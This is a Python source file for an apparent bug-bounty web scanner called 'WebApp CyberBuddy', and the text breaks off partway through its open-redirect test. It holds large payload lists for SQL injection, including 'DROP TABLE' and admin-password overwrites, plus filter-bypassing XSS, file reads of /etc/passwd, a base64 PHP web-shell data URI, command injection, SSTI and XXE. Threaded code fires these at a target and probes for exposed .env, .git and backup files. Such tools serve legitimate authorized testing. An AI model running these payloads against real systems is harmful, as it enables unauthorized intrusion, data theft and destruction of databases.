#!/usr/bin/env python3
"""
🔒 WebApp CyberBuddy - Advanced Web Application Security Testing Tool 🔒
Specialized for bug bounty hunting and web application penetration testing

Created by: Harsh Malhotra
Version: 1.0
"""

import argparse
import json
import os
import subprocess
import sys
import time
import re
import base64
import urllib.parse
import hashlib
import random
import string
from datetime import datetime
from pathlib import Path
import requests
import threading
from urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
import concurrent.futures

# Disable SSL warnings for testing
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class WebAppCyberBuddy:
    def __init__(self):
        self.banner = """
╔══════════════════════════════════════════════════════════════════╗
║                🕷️  WEBAPP CYBER BUDDY 🕷️                        ║
║          Advanced Web Application Security Testing Tool          ║
║                     Built by Harsh Malhotra                     ║
║  Features: SQL Injection • XSS • CSRF • IDOR • Auth Bypass     ║
║           Directory Fuzzing • Parameter Discovery • WAF Bypass  ║
╚══════════════════════════════════════════════════════════════════╝
"""
        self.data_dir = Path("cyber_data")
        self.data_dir.mkdir(exist_ok=True)
        self.targets_file = self.data_dir / "targets.json"
        self.findings_file = self.data_dir / "findings.json"
        self.payloads_dir = self.data_dir / "payloads"
        self.payloads_dir.mkdir(exist_ok=True)
        
        # HTTP session for persistent connections
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'CyberBuddy/1.0 (by HarshMalhotra) Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # Initialize payload collections
        self.init_payloads()
    
    def init_payloads(self):
        """Initialize attack payloads"""
        # Enhanced SQL injection payloads with various techniques
        self.sql_payloads = [
            # Basic injection tests
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'x'='x",
            "admin'--",
            "' OR '1'='1' /*",
            "') OR ('1'='1",
            "' OR 1=1#",
            
            # Union-based injections
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3,4--+",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--+",
            "1' UNION SELECT @@version,@@datadir--+",
            "' UNION SELECT user(),database(),version()--+",
            "' UNION SELECT table_name FROM information_schema.tables--+",
            "' UNION SELECT column_name FROM information_schema.columns--+",
            
            # Boolean-based blind injection
            "' AND 1=1--+",
            "' AND 1=2--+",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--+",
            "' AND LENGTH(database())>1--+",
            "' AND ASCII(SUBSTRING(database(),1,1))>64--+",
            "' AND (SELECT COUNT(*) FROM mysql.user)>0--+",
            "' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_schema=database())--+",
            
            # Time-based blind injection
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "'; SELECT PG_SLEEP(5)--",
            "' OR IF(1=1,SLEEP(5),0)--+",
            "' UNION SELECT IF(1=1,SLEEP(5),0)--+",
            "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SLEEP(5))--+",
            
            # Error-based injection
            "' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--+",
            "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+",
            "' OR (SELECT * FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT user()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.columns GROUP BY x)a)--+",
            
            # Second-order injection
            "'; INSERT INTO users (username,password) VALUES ('admin','password')--+",
            "'; UPDATE users SET password='newpass' WHERE username='admin'--+",
            "'; DROP TABLE users--",
            
            # NoSQL injection attempts
            "'||'1'=='1",
            "' || 1==1//",
            "'||this.password!=''",
            "'; return true; //",
            "'; return 1==1; //",
            
            # WAF bypass attempts
            "' /**/OR/**/ '1'='1",
            "'/*comment*/OR/**/1=1--+",
            "' /*!OR*/ 1=1--+",
            "'/**/UNION/**/SELECT/**/*/*",
            "' %55NION %53ELECT 1,2,3--+",
            "' UnIoN SeLeCt 1,2,3--+",
            "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--+",
            
            # Database-specific payloads
            "' OR 1=1 LIMIT 1 OFFSET 0--+",  # PostgreSQL
            "' OR ROWNUM<=1--+",  # Oracle
            "' OR 1=1 HAVING 1=1--+",  # SQL Server
            "' OR 1=1 FOR XML PATH('')--+",  # SQL Server
            "' UNION SELECT sqlite_version()--+",  # SQLite
        ]
        
        # Enhanced XSS payloads with various bypass techniques
        self.xss_payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><img src=x onerror=alert('XSS')>",
            
            # Event handlers
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<meter onmouseover=alert('XSS')>",
            
            # Filter bypass techniques
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/.source)</script>",
            "<script>alert`XSS`</script>",
            "<script>eval(\"ale\"+\"rt('XSS')\")</script>",
            
            # Encoded payloads
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            
            # Context-breaking payloads
            "</title><script>alert('XSS')</script>",
            "</textarea><script>alert('XSS')</script>",
            "</option><script>alert('XSS')</script>",
            "</script><script>alert('XSS')</script>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</style><script>alert('XSS')</script>",
            "</noscript><script>alert('XSS')</script>",
            
            # DOM-based XSS
            "#<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:msgbox(\"XSS\")",
            
            # Advanced bypass
            "<svg/onload=alert('XSS')>",
            "<img/src/onerror=alert('XSS')>",
            "<iframe/onload=alert('XSS')></iframe>",
            "<object data=\"data:text/html,<script>alert('XSS')</script>\"></object>",
            "<embed src=\"data:text/html,<script>alert('XSS')</script>\"></embed>",
            "<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\"></textarea><img onerror=alert('XSS') src>",
            
            # AngularJS and framework-specific
            "{{constructor.constructor('alert(\"XSS\")')()}}",
            "{{$eval.constructor('alert(\"XSS\")')()}}",
            "{{$on.constructor('alert(\"XSS\")')()}}",
            "<div ng-app ng-csp><input ng-focus=$event.view.alert('XSS') autofocus>",
            
            # CSS-based XSS
            "<style>body{background:url(\"javascript:alert('XSS')\")}</style>",
            "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
            "<style>@import\"javascript:alert('XSS')\";</style>",
            
            # Polyglot payloads
            "javascript://'/\"/*\"/*`/*'/*</template></textarea></noembed></noscript></title></style></script>--><svg onload=alert('XSS')>",
            "'><\"--><svg onload=alert('XSS')>",
        ]
        
        self.lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "../../../etc/passwd%00",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....%5c....%5c....%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "expect://id",
            "file:///etc/passwd",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline"
        ]
        
        self.rce_payloads = [
            "; id",
            "| id",
            "& id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "& whoami",
            "; ls -la",
            "| ls -la",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; ping -c 4 127.0.0.1",
            "| ping -c 4 127.0.0.1"
        ]
        
        self.ssti_payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config}}",
            "{{config.items()}}",
            "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "<%= 7*7 %>",
            "${7*7}",
            "#{7*7}",
            "*{7*7}"
        ]
        
        self.xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>'
        ]
        
        self.common_dirs = [
            "/admin", "/administrator", "/wp-admin", "/phpmyadmin", "/manager",
            "/api", "/v1", "/v2", "/rest", "/graphql",
            "/backup", "/backups", "/bak", "/old", "/tmp",
            "/test", "/testing", "/dev", "/development", "/staging",
            "/login", "/signin", "/auth", "/authentication",
            "/config", "/configuration", "/settings", "/setup",
            "/upload", "/uploads", "/files", "/assets",
            "/docs", "/documentation", "/help", "/support",
            "/dashboard", "/panel", "/control", "/console",
            "/webmail", "/mail", "/email", "/mailbox",
            "/database", "/db", "/mysql", "/postgres",
            "/logs", "/log", "/debug", "/trace",
            "/status", "/health", "/info", "/version",
            "/.git", "/.svn", "/.env", "/robots.txt", "/sitemap.xml"
        ]
        
        self.common_files = [
            "index.php", "admin.php", "login.php", "config.php",
            "database.php", "db.php", "connection.php", "connect.php",
            "backup.sql", "dump.sql", "database.sql", "db.sql",
            ".env", ".htaccess", ".htpasswd", "web.config",
            "phpinfo.php", "info.php", "test.php", "debug.php",
            "readme.txt", "README.md", "CHANGELOG.md", "TODO.txt",
            "composer.json", "package.json", "yarn.lock", "package-lock.json",
            "robots.txt", "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml"
        ]
        
    def show_banner(self):
        print(self.banner)
        
    def load_targets(self):
        """Load saved targets"""
        if self.targets_file.exists():
            with open(self.targets_file, 'r') as f:
                return json.load(f)
        return {}
    
    def save_targets(self, targets):
        """Save targets to file"""
        with open(self.targets_file, 'w') as f:
            json.dump(targets, f, indent=2)
    
    def load_findings(self):
        """Load saved findings"""
        if self.findings_file.exists():
            with open(self.findings_file, 'r') as f:
                return json.load(f)
        return []
    
    def save_findings(self, findings):
        """Save findings to file"""
        with open(self.findings_file, 'w') as f:
            json.dump(findings, f, indent=2)

    def add_target(self, name, url, program_type="private"):
        """Add a new target to track"""
        targets = self.load_targets()
        targets[name] = {
            "url": url,
            "program_type": program_type,
            "added_date": datetime.now().isoformat(),
            "status": "active",
            "subdomains": [],
            "endpoints": [],
            "vulnerabilities": []
        }
        self.save_targets(targets)
        print(f"✅ Target '{name}' added successfully!")
    
    def list_targets(self):
        """List all targets"""
        targets = self.load_targets()
        if not targets:
            print("❌ No targets found. Add some targets first!")
            return
        
        print("\n🎯 YOUR TARGETS:")
        print("-" * 60)
        for name, info in targets.items():
            status_emoji = "🟢" if info["status"] == "active" else "🔴"
            print(f"{status_emoji} {name}")
            print(f"   URL: {info['url']}")
            print(f"   Type: {info['program_type']}")
            print(f"   Added: {info['added_date'][:10]}")
            print(f"   Subdomains: {len(info.get('subdomains', []))}")
            print(f"   Vulnerabilities: {len(info.get('vulnerabilities', []))}")
            print()

    def reconnaissance(self, target_name):
        """Perform reconnaissance on a target"""
        targets = self.load_targets()
        if target_name not in targets:
            print(f"❌ Target '{target_name}' not found!")
            return
        
        target = targets[target_name]
        url = target["url"]
        
        print(f"🔍 Starting reconnaissance on {target_name} ({url})")
        print("=" * 60)
        
        # Subdomain enumeration
        print("1️⃣ Subdomain Enumeration...")
        subdomains = self.find_subdomains(url)
        target["subdomains"] = subdomains
        
        # Port scanning
        print("2️⃣ Port Scanning...")
        self.port_scan(url)
        
        # Directory enumeration
        print("3️⃣ Directory Enumeration...")
        self.directory_enum(url)
        
        # Technology detection
        print("4️⃣ Technology Detection...")
        self.tech_detection(url)
        
        # Save updated target info
        targets[target_name] = target
        self.save_targets(targets)
        
        print("✅ Reconnaissance completed!")
    
    def find_subdomains(self, domain):
        """Find subdomains (simulated - in real use, integrate with tools like subfinder)"""
        print(f"   Searching for subdomains of {domain}...")
        
        # Common subdomain prefixes to check
        common_subs = ["www", "mail", "ftp", "admin", "test", "dev", "staging", "api", "blog"]
        found_subs = []
        
        for sub in common_subs:
            subdomain = f"{sub}.{domain}"
            try:
                # Simple DNS lookup simulation
                print(f"   Checking: {subdomain}")
                # In real implementation, use proper DNS lookup
                found_subs.append(subdomain)
            except:
                pass
        
        print(f"   Found {len(found_subs)} potential subdomains")
        return found_subs
    
    def port_scan(self, target):
        """Perform port scanning"""
        print(f"   Scanning common ports on {target}...")
        common_ports = [80, 443, 22, 21, 25, 53, 110, 995, 143, 993, 8080, 8443]
        print(f"   Checking ports: {', '.join(map(str, common_ports))}")
        # In real implementation, use nmap or python-nmap
        print("   Port scan results would appear here...")
    
    def directory_enum(self, target):
        """Advanced directory and file enumeration"""
        print(f"   Performing directory enumeration on {target}...")
        
        found_dirs = []
        found_files = []
        
        # Test common directories
        for directory in self.common_dirs[:10]:  # Test first 10 to avoid too many requests
            test_url = f"{target.rstrip('/')}{directory}"
            try:
                response = self.session.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    found_dirs.append(directory)
                    print(f"   ✅ Found directory: {directory} (Status: {response.status_code})")
                elif response.status_code == 403:
                    found_dirs.append(f"{directory} (403 Forbidden)")
                    print(f"   🔒 Forbidden directory: {directory} (Status: 403)")
            except requests.RequestException:
                continue
        
        # Test common files
        for file in self.common_files[:10]:  # Test first 10 to avoid too many requests
            test_url = f"{target.rstrip('/')}/{file}"
            try:
                response = self.session.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    found_files.append(file)
                    print(f"   ✅ Found file: {file} (Status: {response.status_code}, Size: {len(response.content)} bytes)")
            except requests.RequestException:
                continue
        
        if not found_dirs and not found_files:
            print("   ❌ No interesting directories or files found")
        else:
            print(f"   📊 Summary: {len(found_dirs)} directories, {len(found_files)} files found")
    
    def tech_detection(self, target):
        """Advanced technology and framework detection"""
        print(f"   Analyzing technology stack for {target}...")
        
        try:
            response = self.session.get(target, timeout=10, verify=False)
            headers = response.headers
            content = response.text
            
            technologies = []
            
            # Server detection
            server = headers.get('Server', '')
            if server:
                technologies.append(f"Server: {server}")
            
            # Programming language detection
            if 'X-Powered-By' in headers:
                technologies.append(f"Powered by: {headers['X-Powered-By']}")
            
            # Framework detection from headers
            framework_headers = {
                'X-AspNet-Version': 'ASP.NET',
                'X-AspNetMvc-Version': 'ASP.NET MVC',
                'X-Drupal-Cache': 'Drupal',
                'X-Generator': 'CMS Generator',
                'X-Powered-CMS': 'CMS'
            }
            
            for header, tech in framework_headers.items():
                if header in headers:
                    technologies.append(f"{tech}: {headers[header]}")
            
            # Content-based detection
            content_indicators = {
                'wp-content': 'WordPress',
                'Drupal.settings': 'Drupal',
                'Joomla': 'Joomla',
                'laravel_token': 'Laravel',
                'symfony': 'Symfony',
                'django': 'Django',
                'flask': 'Flask',
                'express': 'Express.js',
                'angular': 'AngularJS',
                'react': 'React',
                'vue': 'Vue.js',
                'bootstrap': 'Bootstrap',
                'jquery': 'jQuery'
            }
            
            for indicator, tech in content_indicators.items():
                if indicator.lower() in content.lower():
                    technologies.append(tech)
            
            # Security headers analysis
            security_headers = {
                'Strict-Transport-Security': 'HSTS',
                'X-Frame-Options': 'Frame Options',
                'X-Content-Type-Options': 'Content Type Options',
                'X-XSS-Protection': 'XSS Protection',
                'Content-Security-Policy': 'CSP'
            }
            
            missing_security = []
            for header, name in security_headers.items():
                if header in headers:
                    technologies.append(f"Security - {name}: {headers[header]}")
                else:
                    missing_security.append(name)
            
            # Display results
            if technologies:
                print("   🔍 Detected Technologies:")
                for tech in technologies[:10]:  # Limit output
                    print(f"      • {tech}")
            else:
                print("   ❌ No obvious technologies detected")
            
            if missing_security:
                print("   ⚠️  Missing Security Headers:")
                for header in missing_security[:5]:  # Limit output
                    print(f"      • {header}")
            
        except requests.RequestException as e:
            print(f"   ❌ Error during technology detection: {e}")

    def vulnerability_scan(self, target_name):
        """Perform comprehensive vulnerability scanning"""
        targets = self.load_targets()
        if target_name not in targets:
            print(f"❌ Target '{target_name}' not found!")
            return
        
        target_url = targets[target_name]['url']
        print(f"🔍 Starting comprehensive vulnerability scan on {target_name}")
        print(f"Target: {target_url}")
        print("=" * 70)
        
        # Test different vulnerability types
        self.test_sql_injection(target_url)
        self.test_xss_vulnerabilities(target_url)
        self.test_lfi_vulnerabilities(target_url)
        self.test_rce_vulnerabilities(target_url)
        self.test_ssti_vulnerabilities(target_url)
        self.test_xxe_vulnerabilities(target_url)
        self.test_open_redirects(target_url)
        self.test_idor(target_url)
        
        print("\n✅ Comprehensive vulnerability scan completed!")
    
    def test_sql_injection(self, url):
        """Advanced SQL injection testing with multiple techniques"""
        print("\n💉 Testing SQL Injection vulnerabilities (Enhanced)...")
        print("   Testing: Error-based, Time-based, Boolean-based, Union-based")
        
        # Expanded parameter names to test
        params_to_test = ['id', 'user', 'search', 'q', 'query', 'name', 'email', 'page', 'category', 
                         'userid', 'username', 'login', 'password', 'item', 'product', 'article',
                         'newsid', 'postid', 'blogid', 'comment', 'file', 'doc', 'action', 'cmd']
        
        vulnerabilities_found = []
        
        # Enhanced SQL error patterns
        sql_errors = [
            # MySQL errors
            "mysql_fetch_array", "warning: mysql", "mysqlsyntaxerrorexception",
            "valid mysql result", "mysql_num_rows", "mysql_fetch_assoc",
            "you have an error in your sql syntax", "unknown column", "table doesn't exist",
            "operand should contain 1 column", "the used select statements have a different number of columns",
            
            # PostgreSQL errors
            "postgresql query failed", "warning: pg_", "valid postgresql result",
            "pg_query()", "pg_exec()", "syntax error at or near", "operator does not exist",
            "column reference", "must appear in the group by",
            
            # Oracle errors
            "ora-00933", "ora-00936", "ora-00942", "ora-00904", "ora-01756",
            "oracle error", "quoted string not properly terminated",
            
            # SQL Server errors
            "microsoft ole db provider", "odbc sql server driver", "sql server",
            "unclosed quotation mark", "incorrect syntax near", "invalid column name",
            "conversion failed when converting", "statement terminates",
            
            # SQLite errors
            "sqlite3::", "sqlite3.operationalerror", "sqlite_error", "no such table",
            "no such column", "sql logic error", "near \",\": syntax error",
            
            # Generic SQL errors
            "syntax error", "sql command not properly ended", "query failed",
            "database error", "warning: ", "fatal error", "invalid query"
        ]
        
        print(f"   Testing {len(params_to_test)} parameters with {len(self.sql_payloads)} payloads...")
        
        # Test with threading for faster execution
        def test_sqli_param(param):
            param_vulns = []
            
            for i, payload in enumerate(self.sql_payloads):
                if i >= 20:  # Limit to first 20 payloads per parameter
                    break
                    
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                
                try:
                    # Error-based detection
                    response = self.session.get(test_url, timeout=15, verify=False)
                    response_text = response.text.lower()
                    
                    for error in sql_errors:
                        if error.lower() in response_text:
                            vuln_info = {
                                'type': 'Error-based SQLi',
                                'param': param,
                                'payload': payload,
                                'url': test_url,
                                'evidence': error,
                                'confidence': 'High'
                            }
                            param_vulns.append(vuln_info)
                            print(f"   🚨 ERROR-BASED SQLi FOUND! Param: {param}, Error: {error}")
                            break
                    
                    # Time-based blind injection detection
                    if any(keyword in payload.upper() for keyword in ['SLEEP', 'WAITFOR', 'PG_SLEEP', 'DELAY']):
                        # Test with time delay
                        start_time = time.time()
                        try:
                            response = self.session.get(test_url, timeout=20, verify=False)
                            elapsed = time.time() - start_time
                            
                            # Also test baseline without delay
                            baseline_url = f"{url}?{param}=1"
                            baseline_start = time.time()
                            baseline_response = self.session.get(baseline_url, timeout=10, verify=False)
                            baseline_elapsed = time.time() - baseline_start
                            
                            # If response is significantly slower
                            if elapsed > (baseline_elapsed + 3) and elapsed > 4:
                                vuln_info = {
                                    'type': 'Time-based blind SQLi',
                                    'param': param,
                                    'payload': payload,
                                    'url': test_url,
                                    'evidence': f'Delay: {elapsed:.2f}s vs baseline: {baseline_elapsed:.2f}s',
                                    'confidence': 'High'
                                }
                                param_vulns.append(vuln_info)
                                print(f"   🚨 TIME-BASED SQLi FOUND! Param: {param}, Delay: {elapsed:.2f}s")
                                
                        except requests.Timeout:
                            # Timeout could indicate successful time-based injection
                            vuln_info = {
                                'type': 'Time-based blind SQLi (Timeout)',
                                'param': param,
                                'payload': payload,
                                'url': test_url,
                                'evidence': 'Request timeout (>20s)',
                                'confidence': 'Medium'
                            }
                            param_vulns.append(vuln_info)
                            print(f"   ⚠️  POTENTIAL TIME-BASED SQLi (Timeout)! Param: {param}")
                    
                    # Boolean-based blind injection (simplified heuristic)
                    if "AND 1=1" in payload or "AND 1=2" in payload:
                        # Test true condition
                        true_payload = payload.replace("AND 1=2", "AND 1=1")
                        true_url = f"{url}?{param}={urllib.parse.quote(true_payload)}"
                        true_response = self.session.get(true_url, timeout=10, verify=False)
                        
                        # Test false condition
                        false_payload = payload.replace("AND 1=1", "AND 1=2")
                        false_url = f"{url}?{param}={urllib.parse.quote(false_payload)}"
                        false_response = self.session.get(false_url, timeout=10, verify=False)
                        
                        # Compare responses
                        if (true_response.status_code == 200 and false_response.status_code != 200) or \
                           (len(true_response.text) > len(false_response.text) + 100):
                            vuln_info = {
                                'type': 'Boolean-based blind SQLi',
                                'param': param,
                                'payload': payload,
                                'url': test_url,
                                'evidence': f'True condition: {len(true_response.text)} chars, False condition: {len(false_response.text)} chars',
                                'confidence': 'Medium'
                            }
                            param_vulns.append(vuln_info)
                            print(f"   🔍 POTENTIAL BOOLEAN-BASED SQLi! Param: {param}")
                    
                    # Union-based injection detection
                    if "UNION" in payload.upper():
                        if response.status_code == 200:
                            # Look for typical union injection indicators
                            union_indicators = [
                                "mysql", "postgresql", "oracle", "sqlite", "version",
                                "information_schema", "table_name", "column_name",
                                "database()", "user()", "@@version"
                            ]
                            
                            for indicator in union_indicators:
                                if indicator.lower() in response_text:
                                    vuln_info = {
                                        'type': 'Union-based SQLi',
                                        'param': param,
                                        'payload': payload,
                                        'url': test_url,
                                        'evidence': f'Union injection indicator: {indicator}',
                                        'confidence': 'High'
                                    }
                                    param_vulns.append(vuln_info)
                                    print(f"   🔗 UNION-BASED SQLi FOUND! Param: {param}, Indicator: {indicator}")
                                    break
                    
                except requests.RequestException as e:
                    continue
                    
            return param_vulns
        
        # Use threading for faster testing
        all_vulnerabilities = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            future_to_param = {executor.submit(test_sqli_param, param): param for param in params_to_test[:10]}
            
            for future in concurrent.futures.as_completed(future_to_param):
                param_vulns = future.result()
                all_vulnerabilities.extend(param_vulns)
        
        # Report findings
        if all_vulnerabilities:
            print(f"\n   🎯 SQL INJECTION SUMMARY: {len(all_vulnerabilities)} potential vulnerabilities found!")
            print("   " + "="*50)
            
            for vuln in all_vulnerabilities[:10]:  # Show first 10
                print(f"   🚨 {vuln['type']} - {vuln['param']}")
                print(f"      Confidence: {vuln['confidence']}")
                print(f"      Evidence: {vuln['evidence'][:100]}...")
                print(f"      URL: {vuln['url'][:80]}...")
                print()
                
        else:
            print("   ✅ No obvious SQL injection vulnerabilities detected")
            print("   💡 Consider manual testing with tools like SQLMap for thorough analysis")
    
    def test_xss_vulnerabilities(self, url):
        """Test for XSS vulnerabilities"""
        print("\n🎯 Testing XSS vulnerabilities...")
        
        params_to_test = ['q', 'search', 'name', 'comment', 'message', 'input', 'data']
        
        for param in params_to_test[:3]:
            for payload in self.xss_payloads[:5]:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=10, verify=False)
                    
                    # Check if payload is reflected in response
                    if payload in response.text or payload.replace('"', '&quot;') in response.text:
                        # Basic XSS detection (not foolproof)
                        if "<script>" in payload.lower() and "<script>" in response.text.lower():
                            print(f"   🚨 POTENTIAL REFLECTED XSS FOUND!")
                            print(f"      URL: {test_url}")
                            print(f"      Payload reflected in response")
                            return
                        elif "onerror" in payload.lower() and payload in response.text:
                            print(f"   🚨 POTENTIAL XSS FOUND!")
                            print(f"      URL: {test_url}")
                            print(f"      Event handler payload reflected")
                            return
                            
                except requests.RequestException:
                    continue
                    
        print("   ✅ No obvious XSS vulnerabilities detected")
    
    def test_lfi_vulnerabilities(self, url):
        """Test for Local File Inclusion vulnerabilities"""
        print("\n📁 Testing Local File Inclusion vulnerabilities...")
        
        params_to_test = ['file', 'page', 'include', 'path', 'doc', 'document', 'template']
        
        for param in params_to_test[:3]:
            for payload in self.lfi_payloads[:5]:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=10, verify=False)
                    
                    # Check for common file content indicators
                    lfi_indicators = [
                        "root:x:0:0:", "daemon:", "/bin/bash", "/bin/sh",  # /etc/passwd
                        "# localhost", "127.0.0.1", "::1",  # hosts file
                        "<?php", "<?=",  # PHP files
                        "[mysql]", "[client]",  # config files
                    ]
                    
                    for indicator in lfi_indicators:
                        if indicator in response.text:
                            print(f"   🚨 POTENTIAL LFI FOUND!")
                            print(f"      URL: {test_url}")
                            print(f"      File content detected: {indicator}")
                            return
                            
                except requests.RequestException:
                    continue
                    
        print("   ✅ No obvious LFI vulnerabilities detected")
    
    def test_rce_vulnerabilities(self, url):
        """Test for Remote Code Execution vulnerabilities"""
        print("\n💥 Testing RCE vulnerabilities...")
        
        params_to_test = ['cmd', 'command', 'exec', 'system', 'shell', 'run']
        
        for param in params_to_test[:3]:
            for payload in self.rce_payloads[:5]:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=10, verify=False)
                    
                    # Check for command output indicators
                    rce_indicators = [
                        "uid=", "gid=", "groups=",  # id command
                        "root", "www-data", "apache", "nginx",  # whoami output
                        "total", "drwx", "-rw-",  # ls output
                        "PING", "64 bytes from",  # ping output
                    ]
                    
                    for indicator in rce_indicators:
                        if indicator in response.text:
                            print(f"   🚨 POTENTIAL RCE FOUND!")
                            print(f"      URL: {test_url}")
                            print(f"      Command output detected: {indicator}")
                            return
                            
                except requests.RequestException:
                    continue
                    
        print("   ✅ No obvious RCE vulnerabilities detected")
    
    def test_ssti_vulnerabilities(self, url):
        """Test for Server Side Template Injection"""
        print("\n🎭 Testing SSTI vulnerabilities...")
        
        params_to_test = ['name', 'template', 'view', 'page', 'content']
        
        for param in params_to_test[:3]:
            for payload in self.ssti_payloads[:5]:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=10, verify=False)
                    
                    # Check if mathematical expressions are evaluated
                    if "49" in response.text and "7*7" in payload:  # 7*7 = 49
                        print(f"   🚨 POTENTIAL SSTI FOUND!")
                        print(f"      URL: {test_url}")
                        print(f"      Template expression evaluated")
                        return
                        
                    # Check for template-specific indicators
                    if "{{" in payload and "config" in payload.lower():
                        if "SECRET_KEY" in response.text or "DEBUG" in response.text:
                            print(f"   🚨 POTENTIAL SSTI FOUND!")
                            print(f"      URL: {test_url}")
                            print(f"      Template config exposed")
                            return
                            
                except requests.RequestException:
                    continue
                    
        print("   ✅ No obvious SSTI vulnerabilities detected")
    
    def test_xxe_vulnerabilities(self, url):
        """Test for XXE vulnerabilities"""
        print("\n📄 Testing XXE vulnerabilities...")
        
        for payload in self.xxe_payloads[:2]:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = self.session.post(url, data=payload, headers=headers, timeout=10, verify=False)
                
                # Check for file content in response
                if "root:x:0:0:" in response.text or "daemon:" in response.text:
                    print(f"   🚨 POTENTIAL XXE FOUND!")
                    print(f"      URL: {url}")
                    print(f"      File content detected in XML response")
                    return
                    
            except requests.RequestException:
                continue
                
        print("   ✅ No obvious XXE vulnerabilities detected")
    
    def test_open_redirects(self, url):
        """Test for Open Redirect vulnerabilities"""
        print("\n🔄 Testing Open Redirect vulnerabilities...")
        
        redirect_params = ['url', 'redirect', 'next', 'return', 'goto', 'target', 'link']
        redirect_payloads = [
            "http://evil.com",
            "https://google.com",
            "//evil.com",
            "/\\evil.com",
            "javascript:alert('redirect')"
        ]
        
        for param in redirect_params[:3]:
            for payload in redirect_payloads[:3]:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=10, verify=False, allow_redirects=False)
                    
                    # Check for redirect status codes and location header
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
